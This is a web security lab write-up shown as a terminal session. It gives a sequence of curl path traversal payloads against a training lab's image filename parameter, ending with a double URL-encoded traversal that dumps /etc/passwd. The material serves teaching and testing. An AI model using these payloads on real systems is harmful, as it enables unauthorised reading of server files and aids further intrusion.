# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

```shell
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=../../../etc/passwd
"No such file"
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=/etc/passwd
"No such file"
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=....//....//....//etc/passwd
"No such file"
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=....\/....\/....\/etc/passwd
"No such file"
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
"No such file"
┌──(kali㉿kali)-[~]
└─$ curl https://ac871f591e4bd03cc1de5fde00a9008c.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/home/academy:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```

